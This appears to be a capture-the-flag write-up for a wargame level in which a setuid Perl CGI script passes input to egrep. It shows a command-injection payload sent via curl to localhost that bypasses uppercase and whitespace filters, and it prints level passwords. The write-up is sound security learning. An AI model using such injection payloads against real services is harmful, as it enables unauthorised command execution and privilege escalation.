# Solve Level12
pass : fa6v5ateaw21peobuub8ipe6s

## Description
- home
    - -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl

### level12.pl
- egrep can execute shell cmd
  - we have to pass through some obfuscation (regex) to inject code
    - first regex pass all char from a-z to A-Z
    - the second remove everything after a space char (\s)
      - * because /tmp is lowercase
      - GETFLAG is uppercase because of regex
- y is useless

## Solution
```bash
echo "getflag > /tmp/newFile" > /tmp/GETFLAG
chmod 777 /tmp/GETFLAG
curl localhost:4646?x=\`/*/GETFLAG\`
cat /tmp/newFile #let's go
```

- flag12 : 
- level13 : g1qKMiRpXf53AWhDaU7FEkczr


## Resolve problem

